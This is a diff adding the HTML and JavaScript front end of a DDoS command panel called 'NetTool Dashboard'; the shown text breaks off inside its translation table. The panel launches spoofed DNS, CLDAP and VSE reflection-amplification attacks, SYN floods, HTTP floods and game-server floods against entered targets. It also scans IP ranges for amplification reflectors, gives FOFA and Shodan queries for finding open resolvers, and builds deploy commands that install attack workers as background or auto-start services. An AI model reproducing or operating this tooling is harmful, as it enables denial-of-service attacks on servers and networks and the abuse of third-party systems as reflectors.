@@ -1,0 +1,808 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>NetTool Dashboard</title>
+<script defer src="https://cdn.jsdelivr.net/npm/alpinejs@3.x.x/dist/cdn.min.js"></script>
+<style>
+  :root { --bg:#0a0e14; --panel:#131820; --border:#1e2836; --text:#b0b8c4; --green:#0c6; --red:#f44; --yellow:#fa0; --cyan:#0cc; --accent:#3b82f6; }
+  * { box-sizing:border-box; margin:0; padding:0; }
+  body { background:var(--bg); color:var(--text); font-family:'SF Mono','Consolas',monospace; font-size:13px; }
+  .header { background:var(--panel); border-bottom:1px solid var(--border); padding:12px 20px; display:flex; justify-content:space-between; align-items:center; }
+  .header h1 { color:var(--cyan); font-size:16px; }
+  .lang-btn { background:transparent; border:1px solid var(--border); color:var(--text); padding:4px 10px; border-radius:4px; cursor:pointer; font-size:11px; font-family:inherit; }
+  .lang-btn:hover { border-color:var(--accent); color:var(--cyan); }
+  .lang-btn.active { border-color:var(--accent); color:var(--cyan); background:var(--accent); color:#fff; }
+  .layout { display:grid; grid-template-columns:1fr 1fr; gap:12px; padding:12px; max-width:1400px; margin:0 auto; }
+  .panel { background:var(--panel); border:1px solid var(--border); border-radius:6px; padding:14px; }
+  .panel h2 { color:var(--cyan); font-size:13px; margin-bottom:10px; text-transform:uppercase; letter-spacing:1px; }
+  .panel.full { grid-column:1/-1; }
+  table { width:100%; border-collapse:collapse; }
+  th, td { text-align:left; padding:6px 8px; border-bottom:1px solid var(--border); font-size:12px; }
+  th { color:var(--text); opacity:0.7; font-weight:normal; }
+  .status { display:inline-block; width:7px; height:7px; border-radius:50%; margin-right:6px; }
+  .status.online,.status.READY { background:var(--green); }
+  .status.offline { background:var(--red); }
+  .status.pending { background:var(--yellow); }
+  .status.running { background:var(--accent); animation:pulse 1s infinite; }
+  .status.completed { background:var(--green); }
+  @keyframes pulse { 0%,100%{opacity:1} 50%{opacity:0.3} }
+  .btn { background:var(--accent); color:#fff; border:none; padding:6px 14px; border-radius:4px; cursor:pointer; font-size:11px; font-family:inherit; }
+  .btn.sm { padding:3px 10px; font-size:10px; }
+  .btn.danger { background:var(--red); }
+  .btn:hover { opacity:0.85; }
+  input, select, textarea { background:var(--bg); border:1px solid var(--border); color:var(--text); padding:6px 10px; border-radius:4px; font-size:12px; font-family:inherit; width:100%; margin-bottom:6px; }
+  input:focus, select:focus, textarea:focus { outline:none; border-color:var(--accent); }
+  textarea { resize:vertical; min-height:120px; }
+  .form-row { display:flex; gap:8px; }
+  .form-row > * { flex:1; }
+  .stats-grid { display:grid; grid-template-columns:repeat(4,1fr); gap:10px; margin-bottom:12px; }
+  .stat-card { background:var(--bg); border:1px solid var(--border); border-radius:4px; padding:10px; text-align:center; }
+  .stat-card .value { font-size:22px; font-weight:bold; color:var(--cyan); }
+  .stat-card .label { font-size:10px; color:var(--text); opacity:0.6; margin-top:4px; }
+  .scan-row { display:flex; gap:8px; align-items:flex-end; }
+  .scan-row > * { flex:1; }
+  .scan-row .btn { flex:0; white-space:nowrap; }
+  .log { max-height:200px; overflow-y:auto; font-size:11px; }
+  .log-line { padding:2px 0; border-bottom:1px solid var(--border); }
+  .login-overlay { position:fixed; top:0;left:0;width:100%;height:100%;background:var(--bg);display:flex;align-items:center;justify-content:center;z-index:999; }
+  .login-box { background:var(--panel); border:1px solid var(--border); border-radius:8px; padding:30px; width:380px; text-align:center; }
+  .login-box h2 { color:var(--cyan); margin-bottom:20px; }
+  .login-box input { text-align:center; font-size:14px; padding:10px; }
+  .login-box .btn { width:100%; padding:10px; font-size:14px; margin-top:8px; }
+  .login-error { color:var(--red); font-size:12px; margin-top:8px; }
+  .worker-cmd { background:var(--bg); border:1px solid var(--border); border-radius:4px; padding:10px; font-size:11px; color:var(--green); word-break:break-all; margin-top:6px; }
+  .deploy-opt { display:flex; align-items:center; gap:6px; cursor:pointer; }
+  .deploy-opt input[type="checkbox"] { width:auto; flex:0 0 auto; margin:0; }
+  .progress-bar { height:4px; background:var(--bg); border-radius:2px; overflow:hidden; margin-top:2px; }
+  .progress-fill { height:100%; background:var(--accent); transition:width 0.3s; }
+  .warning { color:var(--yellow); font-size:11px; margin-top:4px; }
+</style>
+</head>
+<body x-data="app()" x-init="init()">
+
+<!-- Login -->
+<div class="login-overlay" x-show="!authed">
+  <div class="login-box">
+    <h2 x-text="t('login_title')"></h2>
+    <input type="password" x-model="token" :placeholder="t('login_placeholder')" @keyup.enter="login()">
+    <button class="btn" @click="login()" x-text="t('login_btn')"></button>
+    <div class="login-error" x-show="error" x-text="error"></div>
+  </div>
+</div>
+
+<!-- Dashboard -->
+<template x-if="authed">
+<div>
+<div class="header">
+  <h1>NetTool Dashboard</h1>
+  <div style="display:flex;gap:12px;align-items:center">
+    <button class="lang-btn" :class="{active:lang==='en'}" @click="setLang('en')">EN</button>
+    <button class="lang-btn" :class="{active:lang==='zh'}" @click="setLang('zh')">中文</button>
+    <span x-text="t('nodes_count').replace('{0}', nodes.length).replace('{1}', tasks.length)"></span>
+    <button class="btn sm danger" @click="logout()" x-text="t('logout')"></button>
+  </div>
+</div>
+
+<div class="layout">
+  <!-- Stats -->
+  <div class="panel full">
+    <h2 x-text="t('live_stats')"></h2>
+    <div class="stats-grid">
+      <div class="stat-card"><div class="value" x-text="formatNum(totalPPS)"></div><div class="label" x-text="t('packets_sec')"></div></div>
+      <div class="stat-card"><div class="value" x-text="totalMBps.toFixed(1)"></div><div class="label" x-text="t('mb_sec')"></div></div>
+      <div class="stat-card"><div class="value" x-text="formatNum(totalPackets)"></div><div class="label" x-text="t('total_packets')"></div></div>
+      <div class="stat-card"><div class="value" x-text="activeWorkers"></div><div class="label" x-text="t('active_online').replace('{0}', activeWorkers).replace('{1}', onlineNodes)"></div></div>
+    </div>
+  </div>
+
+  <!-- Attack Control -->
+  <div class="panel">
+    <h2 x-text="t('new_attack')"></h2>
+    <div class="form-row">
+      <select x-model="form.method">
+        <option value="combo" x-text="'🎯 '+t('method_combo')"></option>
+        <option value="vse" x-text="t('method_vse')"></option>
+        <option value="vse_reflector" x-text="t('method_vse_refl')"></option>
+        <option value="dns_reflector" x-text="t('method_dns_refl')"></option>
+        <option value="cldap_reflector" x-text="t('method_cldap_refl')"></option>
+        <optgroup :label="t('group_udp')">
+          <option value="udp_stdhex" x-text="t('method_udp_stdhex')"></option>
+          <option value="udp_plain" x-text="t('method_udp_plain')"></option>
+          <option value="udp_bypass" x-text="t('method_udp_bypass')"></option>
+          <option value="udp_burst" x-text="t('method_udp_burst')"></option>
+        </optgroup>
+        <optgroup :label="t('group_tcp')">
+          <option value="tcp_syn" x-text="t('method_tcp_syn')"></option>
+          <option value="tcp_syn_spoof" x-text="t('method_tcp_syn_spoof')"></option>
+          <option value="tcp_ack" x-text="t('method_tcp_ack')"></option>
+          <option value="tcp_connect" x-text="t('method_tcp_connect')"></option>
+        </optgroup>
+        <optgroup :label="t('group_l7')">
+          <option value="http_flood" x-text="t('method_http')"></option>
+          <option value="https_bypass" x-text="t('method_https')"></option>
+        </optgroup>
+        <optgroup :label="t('group_game')">
+          <option value="minecraft_handshake" x-text="t('method_mc_handshake')"></option>
+          <option value="minecraft_login" x-text="t('method_mc_login')"></option>
+          <option value="game_udp" x-text="t('method_game_udp')"></option>
+        </optgroup>
+      </select>
+      <select x-model="form.game">
+        <option value="" x-text="t('game_none')"></option>
+        <option value="csgo">CS:GO</option>
+        <option value="minecraft">Minecraft</option>
+        <option value="rust">Rust</option>
+        <option value="pubg">PUBG</option>
+        <option value="ark">ARK</option>
+        <option value="fortnite">Fortnite</option>
+        <option value="apex">Apex</option>
+      </select>
+    </div>
+    <textarea x-model="form.target" :placeholder="t('target_placeholder')" rows="2" style="min-height:45px;margin-bottom:6px"></textarea>
+    <div class="form-row">
+      <input x-model.number="form.duration" type="number" :placeholder="t('duration')" value="60">
+      <input x-model.number="form.threads" type="number" :placeholder="t('threads')" value="10">
+      <input x-model.number="form.packet_size" type="number" :placeholder="t('pkt_size')" value="1400">
+    </div>
+
+    <!-- Combo Sub-Attacks Panel -->
+    <div x-show="form.method === 'combo'" style="border:1px solid var(--border);border-radius:4px;padding:8px;margin-bottom:6px">
+      <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:6px">
+        <span style="font-size:11px;color:var(--cyan)" x-text="t('sub_attacks')"></span>
+        <button class="btn sm" @click="addSubAttack()" style="flex:0" x-text="'+ '+t('add')"></button>
+      </div>
+      <template x-for="(sub, idx) in form.sub_attacks" :key="idx">
+        <div style="display:flex;gap:4px;margin-bottom:4px;align-items:center;flex-wrap:wrap">
+          <select x-model="sub.method" style="width:140px;margin:0;font-size:10px">
+            <option value="vse">VSE</option>
+            <option value="vse_reflector">VSE Refl</option>
+            <option value="dns_reflector">DNS Refl</option>
+            <option value="cldap_reflector">CLDAP Refl</option>
+            <option value="udp_stdhex">UDP Hex</option>
+            <option value="udp_plain">UDP Plain</option>
+            <option value="udp_bypass">UDP Bypass</option>
+            <option value="udp_burst">UDP Burst</option>
+            <option value="tcp_syn">TCP SYN</option>
+            <option value="tcp_syn_spoof">SYN Spoof</option>
+            <option value="tcp_ack">TCP ACK</option>
+            <option value="tcp_connect">TCP Connect</option>
+            <option value="game_udp">Game UDP</option>
+          </select>
+          <input x-model.number="sub.threads" type="number" :placeholder="t('threads')" value="100" style="width:70px;margin:0;font-size:10px">
+          <input x-model.number="sub.packet_size" type="number" :placeholder="t('size')" value="1400" style="width:65px;margin:0;font-size:10px">
+          <input x-model.number="sub.rate_limit_pps" type="number" placeholder="PPS" value="0" style="width:65px;margin:0;font-size:10px">
+          <button class="btn sm danger" @click="removeSubAttack(idx)" style="flex:0;margin:0;font-size:10px;padding:3px 6px">X</button>
+        </div>
+      </template>
+      <div x-show="!form.sub_attacks || form.sub_attacks.length === 0" style="font-size:10px;opacity:0.5;text-align:center;padding:8px" x-text="t('no_sub_attacks')"></div>
+    </div>
+
+    <div class="form-row" style="margin-bottom:6px">
+      <input x-model.number="form.rate_limit_pps" type="number" :placeholder="t('pps_limit')" value="0" step="1000">
+      <input x-model.number="form.rate_limit_bps" type="number" :placeholder="t('bps_limit')" value="0" step="1000000">
+    </div>
+    <div class="form-row" style="align-items:center;margin-bottom:6px;">
+      <label style="font-size:11px;display:flex;align-items:center;gap:4px;cursor:pointer;white-space:nowrap">
+        <input type="checkbox" x-model="form.burst_mode" style="width:auto;margin:0;"> <span x-text="t('burst')"></span>
+      </label>
+      <label style="font-size:11px;display:flex;align-items:center;gap:4px;cursor:pointer;white-space:nowrap">
+        <input type="checkbox" x-model="form.mix" style="width:auto;margin:0;"> <span x-text="t('mix_queries')"></span>
+      </label>
+      <input x-model.number="form.jitter_ms" type="number" :placeholder="t('jitter_ms')" value="0" style="max-width:80px">
+      <label style="font-size:11px;display:flex;align-items:center;gap:4px;cursor:pointer;white-space:nowrap" x-show="isReflectorMethod(form.method)">
+        <input type="checkbox" x-model="form.fallback_to_udp" style="width:auto;margin:0;"> <span x-text="t('fallback_udp')"></span>
+      </label>
+    </div>
+    <div style="display:flex;gap:6px;margin-top:4px">
+      <button class="btn" @click="startAttack()" :disabled="!form.target" style="flex:1" x-text="t('start_attack')"></button>
+      <select x-model="selectedTemplate" @change="loadTemplate()" style="width:auto;flex:0;min-width:100px;margin:0">
+        <option value="" x-text="t('templates')"></option>
+        <template x-for="t in templates">
+          <option :value="t.name" x-text="t.name"></option>
+        </template>
+      </select>
+      <button class="btn sm" @click="saveTemplate()" style="flex:0" x-text="t('save')"></button>
+      <button class="btn sm danger" @click="deleteTemplate()" style="flex:0" x-text="t('delete')"></button>
+    </div>
+    <div class="warning" x-show="nodes.length === 0" x-text="t('no_workers_warn')"></div>
+  </div>
+
+  <!-- VSE Scanner -->
+  <div class="panel">
+    <h2 x-text="t('vse_scanner')"></h2>
+    <div class="scan-row">
+      <input x-model.trim="scan.startIP" :placeholder="t('start_ip')">
+      <input x-model.trim="scan.endIP" :placeholder="t('end_ip')">
+      <input x-model.number="scan.port" type="number" placeholder="Port" value="27015" style="max-width:80px">
+      <button class="btn" @click="startScan()" x-text="t('scan')"></button>
+    </div>
+    <div class="log" style="margin-top:8px">
+      <template x-for="r in scan.results" :key="r.ip">
+        <div class="log-line" style="padding:6px 0">
+          <div>
+            <span style="color:var(--green)">&#10003;</span>
+            <span x-text="r.ip + ':' + r.port" style="color:var(--cyan)"></span>
+            <span style="color:var(--text);margin-left:8px" x-text="r.response_size + ' bytes'"></span>
+            <button class="btn sm" @click="form.target = r.ip + ':' + r.port; form.method='vse'" style="margin-left:8px" x-text="t('attack')"></button>
+          </div>
+          <div x-show="r.server_name" style="font-size:10px;opacity:0.7;margin-top:2px" x-text="r.server_name"></div>
+          <div x-show="r.game" style="font-size:10px;opacity:0.6">
+            <span x-text="r.game"></span>
+            <span x-show="r.map" x-text="' | ' + r.map"></span>
+            <span x-show="r.players >= 0" x-text="' | ' + r.players + '/' + r.max_players"></span>
+            <span x-show="r.vac" style="color:var(--yellow)"> | VAC</span>
+          </div>
+        </div>
+      </template>
+      <div x-show="scan.scanning" style="color:var(--yellow)" x-text="t('scanning')"></div>
+      <div x-show="scan.error" style="color:var(--red);margin-top:6px" x-text="scan.error"></div>
+    </div>
+  </div>
+
+  <!-- DNS Resolver Scanner -->
+  <div class="panel">
+    <h2 x-text="t('dns_scanner')"></h2>
+    <div class="scan-row">
+      <input x-model.trim="dnsScan.startIP" :placeholder="t('start_ip')">
+      <input x-model.trim="dnsScan.endIP" :placeholder="t('end_ip')">
+      <input x-model.number="dnsScan.port" type="number" placeholder="Port" value="53" style="max-width:70px">
+      <button class="btn" @click="startDNSScan()" x-text="t('scan')"></button>
+    </div>
+    <div class="log" style="margin-top:8px">
+      <template x-for="r in dnsScan.results" :key="r.ip + ':' + r.port">
+        <div class="log-line" style="padding:6px 0">
+          <span style="color:var(--green)">&#10003;</span>
+          <span x-text="r.ip + ':' + r.port" style="color:var(--cyan)"></span>
+          <span style="color:var(--text);margin-left:8px" x-text="r.response_size + ' bytes'"></span>
+          <button class="btn sm" @click="addToDNSPool(r)" style="margin-left:8px" x-text="t('add_to_pool')"></button>
+        </div>
+      </template>
+      <div x-show="dnsScan.scanning" style="color:var(--yellow)" x-text="t('scanning')"></div>
+      <div x-show="dnsScan.error" style="color:var(--red);margin-top:6px" x-text="dnsScan.error"></div>
+      <div x-show="dnsScan.resultCount > 0 && !dnsScan.scanning" style="margin-top:4px;font-size:10px;opacity:0.6">
+        <span x-text="dnsScan.resultCount"></span> <span x-text="t('resolvers_found')"></span>.
+        <a href="#" @click.prevent="addAllToDNSPool()" style="color:var(--accent)" x-text="t('add_all_to_pool')"></a>
+      </div>
+    </div>
+    <details style="margin-top:10px;font-size:11px;opacity:0.7">
+      <summary style="cursor:pointer;color:var(--cyan)" x-text="t('fofa_tips')"></summary>
+      <div style="margin-top:6px;padding:8px;background:var(--bg);border-radius:4px">
+        <div style="margin-bottom:6px;font-weight:bold;color:var(--accent)">FOFA:</div>
+        <code style="display:block;margin-bottom:4px;word-break:break-all">port="53" &amp;&amp; protocol="dns" &amp;&amp; (country="US" || country="JP" || country="KR" || country="DE" || country="GB" || country="NL" || country="FR" || country="SG")</code>
+        <div style="margin:6px 0;font-weight:bold;color:var(--accent)">Shodan:</div>
+        <code style="display:block;margin-bottom:4px">port:53 country:"US","JP","KR","DE","GB","NL","FR","SG"</code>
+        <div style="margin-top:6px;color:var(--text);font-size:10px" x-text="t('fofa_export_tip')"></div>
+      </div>
+    </details>
+  </div>
+
+  <!-- Nodes -->
+  <div class="panel">
+    <h2 x-text="t('worker_nodes') + ' (' + nodes.length + ')'"></h2>
+    <table>
+      <thead><tr><th x-text="t('col_id')"></th><th x-text="t('col_ip')"></th><th x-text="t('col_os')"></th><th x-text="t('col_cpu')"></th><th x-text="t('col_mem')"></th><th x-text="t('col_status')"></th></tr></thead>
+      <tbody>
+        <template x-for="n in nodes" :key="n.worker_id">
+          <tr>
+            <td x-text="n.worker_id" style="color:var(--cyan);font-size:11px"></td>
+            <td x-text="n.ip || '-'"></td>
+            <td x-text="n.is_windows ? 'Windows' : 'Linux'"></td>
+            <td x-text="(n.cpu_percent||0) + '%'"></td>
+            <td x-text="(n.memory_mb||0) + ' MB'"></td>
+            <td><span :class="'status ' + n.status"></span><span x-text="n.status"></span></td>
+          </tr>
+        </template>
+      </tbody>
+    </table>
+  </div>
+
+  <!-- Tasks -->
+  <div class="panel">
+    <h2 x-text="t('tasks') + ' (' + tasks.length + ')'"></h2>
+    <table>
+      <thead><tr><th x-text="t('col_id')"></th><th x-text="t('col_target')"></th><th x-text="t('col_method')"></th><th>W</th><th>PPS</th><th x-text="t('col_status')"></th><th></th></tr></thead>
+      <tbody>
+        <template x-for="t in tasks" :key="t.task_id">
+          <tr>
+            <td style="color:var(--cyan);font-size:10px" x-text="t.task_id.slice(-8)"></td>
+            <td x-text="t.target"></td>
+            <td x-text="t.method"></td>
+            <td x-text="Object.keys(t.workers || {}).length"></td>
+            <td x-text="formatNum(taskPPS(t))"></td>
+            <td>
+              <div><span :class="'status ' + t.status"></span><span x-text="t.status"></span></div>
+              <div class="progress-bar" x-show="t.status=='running'">
+                <div class="progress-fill" :style="'width:' + taskProgress(t) + '%'"></div>
+              </div>
+              <span x-show="t.status=='running'" style="font-size:10px;opacity:0.6" x-text="taskTimeLeft(t)"></span>
+            </td>
+            <td>
+              <button x-show="t.status=='running'" class="btn danger sm" @click="stopTask(t.task_id)" x-text="t('stop')"></button>
+            </td>
+          </tr>
+        </template>
+      </tbody>
+    </table>
+  </div>
+
+  <!-- CLDAP Reflector Scanner -->
+  <div class="panel">
+    <h2 x-text="t('cldap_scanner')"></h2>
+    <div class="scan-row">
+      <input x-model.trim="cldapScan.startIP" :placeholder="t('start_ip')">
+      <input x-model.trim="cldapScan.endIP" :placeholder="t('end_ip')">
+      <input x-model.number="cldapScan.port" type="number" placeholder="Port" value="389" style="max-width:70px">
+      <button class="btn" @click="startCLDAPScan()" x-text="t('scan')"></button>
+    </div>
+    <div class="log" style="margin-top:8px">
+      <template x-for="r in cldapScan.results" :key="r.ip + ':' + r.port">
+        <div class="log-line" style="padding:6px 0">
+          <span style="color:var(--green)">&#10003;</span>
+          <span x-text="r.ip + ':' + r.port" style="color:var(--cyan)"></span>
+          <span style="color:var(--text);margin-left:8px" x-text="r.response_size + ' bytes (' + (r.amp_ratio||0).toFixed(1) + 'x)'"></span>
+          <button class="btn sm" @click="addToCLDAPPool(r)" style="margin-left:8px" x-text="t('add_to_pool')"></button>
+        </div>
+      </template>
+      <div x-show="cldapScan.scanning" style="color:var(--yellow)" x-text="t('scanning')"></div>
+      <div x-show="cldapScan.error" style="color:var(--red);margin-top:6px" x-text="cldapScan.error"></div>
+      <div x-show="cldapScan.resultCount > 0 && !cldapScan.scanning" style="margin-top:4px;font-size:10px;opacity:0.6">
+        <span x-text="cldapScan.resultCount"></span> <span x-text="t('reflectors_found')"></span>.
+        <a href="#" @click.prevent="addAllToCLDAPPool()" style="color:var(--accent)" x-text="t('add_all_to_cldap')"></a>
+      </div>
+    </div>
+    <details style="margin-top:10px;font-size:11px;opacity:0.7">
+      <summary style="cursor:pointer;color:var(--cyan)" x-text="t('fofa_tips')"></summary>
+      <div style="margin-top:6px;padding:8px;background:var(--bg);border-radius:4px">
+        <div style="margin-bottom:6px;font-weight:bold;color:var(--accent)">FOFA:</div>
+        <code style="display:block;margin-bottom:4px;word-break:break-all">port="389" &amp;&amp; protocol="cldap"</code>
+        <div style="margin:6px 0;font-weight:bold;color:var(--accent)">Shodan:</div>
+        <code style="display:block">port:389 ldap</code>
+        <div style="margin-top:6px;color:var(--text);font-size:10px" x-text="t('cldap_export_tip')"></div>
+      </div>
+    </details>
+  </div>
+
+  <!-- Proxy Manager -->
+  <div class="panel full">
+    <h2 x-text="t('proxy_manager')"></h2>
+    <div style="display:flex;gap:12px">
+      <div style="flex:1">
+        <textarea x-model="proxyData" placeholder="user:pass@host:port&#10;socks5://user:pass@host:port&#10;http://user:pass@host:port&#10;(one per line, # for comments)"></textarea>
+        <div style="display:flex;gap:8px">
+          <button class="btn" @click="saveProxy()" x-text="t('save_proxy')"></button>
+          <button class="btn" @click="loadProxy()" x-text="t('load_proxy')"></button>
+        </div>
+      </div>
+      <div style="flex:0;min-width:300px;max-width:380px">
+        <div class="panel" style="background:var(--bg);margin:0">
+          <h2 style="margin-bottom:8px" x-text="t('quick_deploy')"></h2>
+          <div style="display:flex;gap:6px;margin-bottom:8px;align-items:center">
+            <input x-model="deployStorage" :placeholder="t('deploy_storage_ph')" style="flex:1;margin-bottom:0">
+            <button class="btn" @click="saveDeploy()" x-text="t('save')" style="flex:0;white-space:nowrap"></button>
+          </div>
+          <div style="display:flex;flex-direction:column;gap:6px;font-size:11px;margin-bottom:8px">
+            <label class="deploy-opt"><input type="checkbox" x-model="deployProxy" @change="buildDeployCmd()"> <span x-text="t('deploy_proxy')"></span></label>
+            <label class="deploy-opt"><input type="checkbox" x-model="deployInstall" @change="toggleInstall()"> <span x-text="t('deploy_install')"></span></label>
+            <label class="deploy-opt"><input type="checkbox" x-model="deployDaemon" @change="buildDeployCmd()"> <span x-text="t('deploy_daemon')"></span></label>
+          </div>
+          <div class="worker-cmd" style="margin-top:0;min-height:32px" x-text="deployCmd || t('deploy_cmd_empty')"></div>
+          <div style="margin-top:8px;font-size:10px;color:var(--text);opacity:0.6;white-space:pre-line" x-text="t('deploy_tip')"></div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- DNS Amp Domain -->
+  <div class="panel full">
+    <h2 x-text="t('dns_amp')"></h2>
+    <div style="display:flex;gap:8px;align-items:center">
+      <input x-model="dnsAmpDomain" placeholder="amp.your-domain.com" style="flex:1">
+      <button class="btn" @click="saveDNSAmp()" x-text="t('save')"></button>
+    </div>
+    <div style="font-size:11px;color:var(--text);opacity:0.6;margin-top:4px" x-text="t('dns_amp_hint')"></div>
+  </div>
+
+  <!-- Steam Reflector Pool -->
+  <div class="panel">
+    <h2 x-text="t('steam_pool') + ' (' + steamCount + ')'"></h2>
+    <div style="display:flex;gap:8px;margin-bottom:8px">
+      <button class="btn" @click="steamRefresh()" :disabled="steamScanning" x-text="steamScanning ? t('scanning') : t('force_refresh')"></button>
+    </div>
+    <div x-show="steamStatus" style="font-size:11px;margin-bottom:6px;color:var(--cyan)" x-text="steamStatus"></div>
+    <div style="max-height:200px;overflow-y:auto;font-size:11px">
+      <template x-for="r in steamList.slice(0, 100)" :key="r.ip + ':' + r.port">
+        <div class="log-line" style="padding:3px 0">
+          <span style="color:var(--green)" x-text="r.ip + ':' + r.port"></span>
+          <span style="margin-left:8px;opacity:0.6" x-text="r.response_size + 'B'"></span>
+          <span x-show="r.game" style="margin-left:8px;color:var(--cyan)" x-text="r.game"></span>
+        </div>
+      </template>
+      <div x-show="steamList.length > 100" style="color:var(--yellow);padding:2px">... +<span x-text="steamList.length - 100"></span></div>
+    </div>
+  </div>
+
+  <!-- Manual Reflector Pool -->
+  <div class="panel">
+    <h2 x-text="t('manual_pool') + ' (' + manualCount + ')'"></h2>
+    <div style="display:flex;gap:8px;margin-bottom:8px">
+      <button class="btn sm" @click="manualTest()" :disabled="manualTesting" x-text="manualTesting ? t('testing') : t('test_clean')"></button>
+      <input x-model="manualAddText" :placeholder="t('manual_add_placeholder')" style="flex:1;margin:0;font-size:11px">
+      <button class="btn sm" @click="manualAdd()" x-text="t('add')"></button>
+    </div>
+    <div x-show="manualStatus" style="font-size:11px;margin-bottom:6px;color:var(--cyan)" x-text="manualStatus"></div>
+    <div style="max-height:200px;overflow-y:auto;font-size:11px">
+      <template x-for="r in manualList.slice(0, 100)" :key="r.ip + ':' + r.port">
+        <div class="log-line" style="padding:3px 0">
+          <span :style="'color:' + (r.last_tested && !r.last_valid ? 'var(--red)' : 'var(--green)')">
+            <span x-text="r.last_tested && !r.last_valid ? '✗' : '✓'"></span>
+            <span x-text="r.ip + ':' + r.port"></span>
+          </span>
+          <span style="margin-left:8px;opacity:0.6" x-text="r.response_size + 'B'"></span>
+          <span x-show="r.game" style="margin-left:8px;color:var(--cyan)" x-text="r.game"></span>
+          <button class="btn danger sm" @click="manualDelete(r.ip, r.port)" style="margin-left:auto" x-text="t('delete')"></button>
+        </div>
+      </template>
+      <div x-show="manualList.length > 100" style="color:var(--yellow);padding:2px">... +<span x-text="manualList.length - 100"></span></div>
+    </div>
+  </div>
+
+</div>
+
+  <!-- Audit Logs -->
+  <div class="panel full">
+    <h2 x-text="t('attack_logs') + ' (' + logTotal + ')'"></h2>
+    <div style="display:flex;gap:8px;margin-bottom:8px;align-items:center">
+      <select x-model="logFilter" @change="fetchLogs()" style="width:auto;margin:0">
+        <option value="" x-text="t('all_methods')"></option>
+        <option value="vse">VSE</option>
+        <option value="vse_reflector">VSE Refl</option>
+        <option value="dns_reflector">DNS Refl</option>
+        <option value="cldap_reflector">CLDAP Refl</option>
+        <option value="udp_stdhex">UDP</option>
+        <option value="tcp_syn">TCP</option>
+        <option value="http_flood">HTTP</option>
+      </select>
+      <button class="btn sm" @click="exportCSV()" x-text="t('export_csv')"></button>
+    </div>
+    <div style="max-height:280px;overflow-y:auto">
+      <table>
+        <thead><tr><th x-text="t('col_time')"></th><th x-text="t('col_target')"></th><th x-text="t('col_method')"></th><th>W</th><th x-text="t('col_packets')"></th><th x-text="t('col_peak_pps')"></th><th x-text="t('col_status')"></th></tr></thead>
+        <tbody>
+          <template x-for="l in logs" :key="l.id">
+            <tr>
+              <td style="font-size:10px" x-text="new Date(l.start_time*1000).toLocaleString().slice(0,16)"></td>
+              <td style="font-size:10px;max-width:120px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap" x-text="l.target"></td>
+              <td style="font-size:10px" x-text="l.method"></td>
+              <td x-text="l.worker_count"></td>
+              <td x-text="formatNum(l.total_packets)"></td>
+              <td x-text="formatNum(l.peak_pps)"></td>
+              <td>
+                <span :class="'status ' + l.status"></span>
+                <span x-text="l.status"></span>
+              </td>
+            </tr>
+          </template>
+        </tbody>
+      </table>
+    </div>
+  </div>
+</div>
+</template>
+
+<script>
+function app() {
+  const TR = {
+    en: {
+      login_title:'NetTool Auth', login_placeholder:'Enter admin token', login_btn:'Login',
+      logout:'Logout', nodes_count:'Nodes: {0} | Tasks: {1}',
+      live_stats:'Live Stats', packets_sec:'PACKETS/SEC', mb_sec:'MB/SEC', total_packets:'TOTAL PACKETS', active_online:'ACTIVE / {0} ONLINE',
+      new_attack:'New Attack',
+      method_combo:'Combo Attack', method_vse:'VSE Amplification', method_vse_refl:'VSE Reflector Amp (IP Spoof)', method_dns_refl:'DNS Reflector Amp (IP Spoof)', method_cldap_refl:'CLDAP Reflector Amp (IP Spoof)',
+      method_udp_stdhex:'UDP StdHex', method_udp_plain:'UDP Plain', method_udp_bypass:'UDP Bypass', method_udp_burst:'UDP Burst',
+      method_tcp_syn:'TCP SYN', method_tcp_syn_spoof:'TCP SYN Spoof (Linux)', method_tcp_ack:'TCP ACK', method_tcp_connect:'TCP Connect',
+      method_http:'HTTP Flood', method_https:'HTTPS Bypass',
+      method_mc_handshake:'Minecraft Handshake', method_mc_login:'Minecraft Login', method_game_udp:'Game UDP Spam',
+      group_udp:'UDP', group_tcp:'TCP', group_l7:'L7', group_game:'Game',
+      game_none:'No Game',
+      target_placeholder:'Target (1.2.3.4:27015 or URL) — one per line for multi-target',
+      duration:'Duration (s)', threads:'Threads', pkt_size:'Pkt Size', size:'Size',
+      pps_limit:'PPS Limit (0=off)', bps_limit:'BPS Limit (0=off)',
+      burst:'Burst', mix_queries:'Mix Queries', jitter_ms:'Jitter ms',
+      start_attack:'Start Attack', templates:'Templates', save:'Save', delete:'Del',
+      no_workers_warn:'No worker nodes connected. Attacks will stay pending until a worker joins.',
+      sub_attacks:'Sub Attacks', add:'Add', no_sub_attacks:'No sub-attacks. Click + Add to configure.',
+      vse_scanner:'VSE Reflector Scanner', dns_scanner:'DNS Resolver Scanner', cldap_scanner:'CLDAP Reflector Scanner',
+      start_ip:'Start IP', end_ip:'End IP', scan:'Scan', scanning:'Scanning...', attack:'Attack',
+      add_to_pool:'Add to Pool', add_all_to_pool:'Add all to DNS pool', add_all_to_cldap:'Add all to CLDAP pool', resolvers_found:'resolvers found', reflectors_found:'reflectors found',
+      fofa_tips:'FOFA / Shodan query tips', cldap_export_tip:'Export as IP:Port list, paste to CLDAP pool page for batch add & auto-verify',
+      worker_nodes:'Worker Nodes', tasks:'Tasks', steam_pool:'Steam Master Pool', manual_pool:'Manual Pool',
+      force_refresh:'Force Refresh Now', test_clean:'Test All & Clean', testing:'Testing...',
+      manual_add_placeholder:'1.2.3.4:27015 (one per line)',
+      proxy_manager:'Proxy Manager', save_proxy:'Save Proxy File', load_proxy:'Load from Server',
+      dns_amp:'DNS Amp Domain', dns_amp_hint:'Enter a domain with large TXT record (up to 4096B). If set, DNS pool validation uses TXT query against this domain instead of isc.org.',
+      save:'Save',
+      quick_deploy:'Quick Deploy', deploy_storage_ph:'Cloud storage URL (worker binary)', deploy_cmd_empty:'Set storage URL then Save to generate command',
+      deploy_proxy:'Fetch L7 proxies (-proxy)', deploy_install:'Install auto-start service (-install)', deploy_daemon:'Run in background (-daemon)',
+      deploy_tip:'Command auto-concatenates controller address + worker token.\nNon-root users: -daemon runs in background without nohup (log: data/worker.log).\n-install and -daemon are mutually exclusive.',
+      attack_logs:'Attack Logs', all_methods:'All Methods', export_csv:'Export CSV',
+      col_id:'ID', col_ip:'IP', col_os:'OS', col_cpu:'CPU', col_mem:'Memory', col_location:'Location', col_status:'Status',
